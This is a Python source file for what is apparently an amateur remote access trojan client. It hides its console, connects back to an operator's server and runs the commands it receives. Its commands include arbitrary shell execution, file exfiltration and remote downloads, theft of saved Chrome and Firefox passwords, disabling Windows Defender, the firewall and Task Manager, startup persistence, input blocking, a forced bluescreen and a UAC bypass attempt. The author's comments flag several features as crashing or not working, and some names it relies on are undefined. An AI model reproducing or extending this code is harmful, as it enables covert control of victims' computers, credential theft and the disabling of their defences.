import socket
import subprocess
import os
import platform
import ctypes
import psutil
import webbrowser
import datetime
import shutil
import sys
import requests
import json
#import pyautogui
import win32gui

def receive_data(client_socket):
    data = client_socket.recv(1024).decode('utf-8')
    return data

def send_data(client_socket, data):
    client_socket.send(data.encode('utf-8'))

def get_system_info():
    system_info = platform.uname()
    return f"System: {system_info.system}\nNode Name: {system_info.node}\nRelease: {system_info.release}\nVersion: {system_info.version}\nMachine: {system_info.machine}\nProcessor: {system_info.processor}"

def command_loop(client_socket):
    while True:
        command = receive_data(client_socket)

        if command == 'exit':
            break

        # When the message is sent the server just stops and wont let me enter the next command until the user clicks ok
        elif command.startswith('message '):
            message = command.split('message ')[1]
            if platform.system() == 'Windows':
                ctypes.windll.user32.MessageBoxW(0, message, 'Message', 0x40 | 0x1)
                client_socket.send('Message displayed successfully'.encode('utf-8'))
            else:
                client_socket.send('Message not supported on this platform'.encode('utf-8'))

        # Add proper checks to see if the user entered something after "shell " and if not do error "Usage is shell <command>"
        elif command.startswith('shell '):
            shell_command = command.split('shell ')[1]
            result = subprocess.run(shell_command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            client_socket.send(output.encode('utf-8'))

        elif command == 'admincheck':
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if is_admin:
                client_socket.send('Admin privileges: True'.encode('utf-8'))
            else:
                client_socket.send('Admin privileges: False'.encode('utf-8'))

        elif command.startswith('cd '):
            directory = command.split('cd ')[1]
            os.chdir(directory)
            client_socket.send('Directory changed'.encode('utf-8'))

        elif command == 'dir':
            file_list = os.listdir()
            file_data = '\n'.join(file_list)
            client_socket.send(file_data.encode('utf-8'))

        # Fails to download preview files like images and text files and anything else
        elif command.startswith('download '):
            file_path = command.split('download ')[1]
            if os.path.isfile(file_path):
                with open(file_path, 'rb') as file:
                    file_data = file.read()
                    client_socket.sendall(file_data)
            else:
                client_socket.send('File not found'.encode('utf-8'))

        elif command.startswith('upload '):
            file_name = command.split('upload ')[1]
            file_data = receive_data(client_socket)
            with open(file_name, 'wb') as file:
                file.write(file_data.encode('utf-8'))
            client_socket.send('File uploaded successfully'.encode('utf-8'))

        elif command.startswith('uploadlink '):
            link, file_name = command.split('uploadlink ')[1].split(' ')
            response = requests.get(link)
            if response.status_code == 200:
                with open(file_name, 'wb') as file:
                    file.write(response.content)
                client_socket.send('File downloaded and uploaded successfully'.encode('utf-8'))
            else:
                client_socket.send('Failed to download file'.encode('utf-8'))

        elif command.startswith('delete '):
            file_path = command.split('delete ')[1]
            if os.path.isfile(file_path):
                os.remove(file_path)
                client_socket.send('File deleted successfully'.encode('utf-8'))
            else:
                client_socket.send('File not found'.encode('utf-8'))

        elif command.startswith('write '):
            sentence = command.split('write ')[1]
            pyautogui.write(sentence)
            client_socket.send('Text written successfully'.encode('utf-8'))

        # sets it as a blaknk color instead of a img like "wallpaper cool.png" it gets set as black instead of the image?
        elif command.startswith('wallpaper '):
            wallpaper_path = command.split('wallpaper ')[1]
            if platform.system() == 'Windows':
                ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
                client_socket.send('Wallpaper changed successfully'.encode('utf-8'))
            else:
                client_socket.send('Wallpaper not supported on this platform'.encode('utf-8'))

        # Crashes Client
        elif command == 'clipboard':
            clipboard_data = pyautogui.paste()
            client_socket.send(clipboard_data.encode('utf-8'))
        # Crashes Client
        elif command == 'idletime':
            idle_time = (ctypes.windll.user32.GetTickCount() - ctypes.windll.user32.GetLastInputInfo()) / 1000.0
            client_socket.send(f'Idle time: {idle_time} seconds'.encode('utf-8'))

        elif command == 'currentdir':
            current_dir = os.getcwd()
            client_socket.send(current_dir.encode('utf-8'))

        elif command == 'block':
            if platform.system() == 'Windows':
                ctypes.windll.user32.BlockInput(True)
                client_socket.send('Keyboard and mouse blocked'.encode('utf-8'))
            else:
                client_socket.send('Blocking not supported on this platform'.encode('utf-8'))

        elif command == 'unblock':
            if platform.system() == 'Windows':
                ctypes.windll.user32.BlockInput(False)
                client_socket.send('Keyboard and mouse unblocked'.encode('utf-8'))
            else:
                client_socket.send('Unblocking not supported on this platform'.encode('utf-8'))
        
        # Crashes client and i think its because its lost
        elif command == 'screenshot':
            screenshot_path = os.path.join(os.getcwd(), 'screenshot.png')
            pyautogui.screenshot(screenshot_path)
            with open(screenshot_path, 'rb') as file:
                screenshot_data = file.read()
                client_socket.sendall(screenshot_data)

        elif command == 'kill':
            if platform.system() == 'Windows':
                if 'all' in command:
                    subprocess.run('taskkill /F /IM *', shell=True)
                    client_socket.send('All processes killed'.encode('utf-8'))
                else:
                    session_id = command.split('kill ')[1]
                    subprocess.run(f'taskkill /F /FI "SESSION eq {session_id}"', shell=True)
                    client_socket.send(f'Session {session_id} killed'.encode('utf-8'))
            else:
                client_socket.send('Process killing not supported on this platform'.encode('utf-8'))

        # Crashes and not 100% sure why but might be to do with admin
        elif command == 'uacbypass':
            if platform.system() == 'Windows':
                windir_path = os.path.join(os.environ['windir'], 'System32')
                subprocess.run(f'copy {windir_path}\\{slui_exe} {os.getcwd()}', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run('slui.exe', shell=True)
                client_socket.send('UAC bypass attempted'.encode('utf-8'))
            else:
                client_socket.send('UAC bypass not supported on this platform'.encode('utf-8'))

        elif command == 'shutdown':
            if platform.system() == 'Windows':
                subprocess.run('shutdown /s /t 0', shell=True)
                client_socket.send('Shutdown command sent'.encode('utf-8'))
            else:
                client_socket.send('Shutdown not supported on this platform'.encode('utf-8'))

        elif command == 'restart':
            if platform.system() == 'Windows':
                subprocess.run('shutdown /r /t 0', shell=True)
                client_socket.send('Restart command sent'.encode('utf-8'))
            else:
                client_socket.send('Restart not supported on this platform'.encode('utf-8'))

        elif command == 'logoff':
            if platform.system() == 'Windows':
                subprocess.run('shutdown /l', shell=True)
                client_socket.send('Logoff command sent'.encode('utf-8'))
            else:
                client_socket.send('Logoff not supported on this platform'.encode('utf-8'))

        # Not testing might work
        elif command == 'bluescreen':
            if platform.system() == 'Windows':
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, None, 6)
                client_socket.send('Bluescreen command sent'.encode('utf-8'))
            else:
                client_socket.send('Bluescreen not supported on this platform'.encode('utf-8'))

        elif command == 'datetime':
            current_datetime = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            client_socket.send(current_datetime.encode('utf-8'))

        elif command.startswith('prockill '):
            process_name = command.split('prockill ')[1]
            for process in psutil.process_iter(['name']):
                if process.info['name'] == process_name:
                    process.kill()
            client_socket.send('Process killed successfully'.encode('utf-8'))

        # Needs admin but works i think
        elif command == 'disabledefender':
            if platform.system() == 'Windows':
                subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True)
                client_socket.send('Windows Defender disabled'.encode('utf-8'))
            else:
                client_socket.send('Windows Defender not supported on this platform'.encode('utf-8'))
        
        # Needs admin but works i think
        elif command == 'disablefirewall':
            if platform.system() == 'Windows':
                subprocess.run('netsh advfirewall set allprofiles state off', shell=True)
                client_socket.send('Windows Firewall disabled'.encode('utf-8'))
            else:
                client_socket.send('Windows Firewall not supported on this platform'.encode('utf-8'))

        elif command == 'critproc':
            if platform.system() == 'Windows':
                subprocess.run(f'schtasks /Change /TN "{os.path.basename(sys.argv[0])}" /TR "{sys.executable}" /RU SYSTEM', shell=True)
                client_socket.send('Process set as critical'.encode('utf-8'))
            else:
                client_socket.send('Process criticality not supported on this platform'.encode('utf-8'))

        elif command == 'uncritproc':
            if platform.system() == 'Windows':
                subprocess.run(f'schtasks /Change /TN "{os.path.basename(sys.argv[0])}" /TR "{sys.executable}"', shell=True)
                client_socket.send('Process set as non-critical'.encode('utf-8'))
            else:
                client_socket.send('Process criticality not supported on this platform'.encode('utf-8'))

        elif command.startswith('website '):
            website_url = command.split('website ')[1]
            webbrowser.open(website_url)
            client_socket.send('Website opened successfully'.encode('utf-8'))
        
        # Needs admin but works i think
        elif command == 'disabletaskmgr':
            if platform.system() == 'Windows':
                subprocess.run('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True)
                client_socket.send('Task Manager disabled'.encode('utf-8'))
            else:
                client_socket.send('Task Manager not supported on this platform'.encode('utf-8'))

        # Needs admin but works i think
        elif command == 'enabletaskmgr':
            if platform.system() == 'Windows':
                subprocess.run('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f', shell=True)
                client_socket.send('Task Manager enabled'.encode('utf-8'))
            else:
                client_socket.send('Task Manager not supported on this platform'.encode('utf-8'))

        # Works
        elif command == 'startup':
            if platform.system() == 'Windows':
                startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                script_name = os.path.basename(sys.argv[0])
                script_path = os.path.join(os.getcwd(), script_name)
                shutil.copy2(script_path, startup_folder)
                client_socket.send('Added to startup'.encode('utf-8'))
            else:
                client_socket.send('Startup not supported on this platform'.encode('utf-8'))

        # Doesnt work :(
        elif command == 'geolocate':
            if platform.system() == 'Windows':
                ip_info = json.loads(requests.get('https://ipinfo.io/json').text)
                latitude, longitude = ip_info['loc'].split(',')
                map_url = f'https://www.google.com/maps/place/{latitude},{longitude}'
                webbrowser.open(map_url)
                client_socket.send('Geolocation information retrieved and opened on Google Maps'.encode('utf-8'))
            else:
                client_socket.send('Geolocation not supported on this platform'.encode('utf-8'))

        elif command == 'listprocess':
            process_list = [f"{process.pid}: {process.name()}" for process in psutil.process_iter(['name'])]
            process_data = '\n'.join(process_list)
            client_socket.send(process_data.encode('utf-8'))

        # Doesnt work just freezes wainting for something?
        elif command == 'password':
            if platform.system() == 'Windows':
                chrome_passwords = []
                firefox_passwords = []

                # Chrome passwords
                if shutil.which('chrome'):
                    chrome_login_db = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
                    shutil.copy2(chrome_login_db, os.getcwd())

                    if os.path.exists('Login Data'):
                        conn = sqlite3.connect('Login Data')
                        cursor = conn.cursor()
                        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                        login_data = cursor.fetchall()

                        for url, username, password in login_data:
                            password = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
                            chrome_passwords.append(f"URL: {url}\nUsername: {username}\nPassword: {password}")

                        cursor.close()
                        conn.close()

                        os.remove('Login Data')

                # Firefox passwords
                if shutil.which('firefox'):
                    firefox_login_db = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles', 'logins.json')
                    shutil.copy2(firefox_login_db, os.getcwd())

                    if os.path.exists('logins.json'):
                        with open('logins.json', 'r') as file:
                            login_data = json.load(file)

                        for login in login_data['logins']:
                            username = login['encryptedUsername']
                            password = login['encryptedPassword']
                            try:
                                decrypted_username = decrypt_firefox_password(username)
                                decrypted_password = decrypt_firefox_password(password)
                                firefox_passwords.append(f"URL: {login['hostname']}\nUsername: {decrypted_username}\nPassword: {decrypted_password}")
                            except:
                                pass

                        os.remove('logins.json')

                all_passwords = '\n\n'.join(chrome_passwords + firefox_passwords)
                client_socket.send(all_passwords.encode('utf-8'))

            else:
                client_socket.send('Password retrieval not supported on this platform'.encode('utf-8'))

        elif command == 'systeminfo':
            system_info = get_system_info()
            client_socket.send(system_info.encode('utf-8'))

        else:
            client_socket.send('Invalid command'.encode('utf-8'))

    client_socket.close()

def main():

    server_ip = 'localhost'  # Replace with your server IP
    server_port = 12345  # Replace with your server port

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    command_loop(client_socket)

if __name__ == '__main__':
    # Hide console window if running on Windows
    if platform.system() == 'Windows':
        win32gui.ShowWindow(win32gui.GetForegroundWindow(), 0)

    main()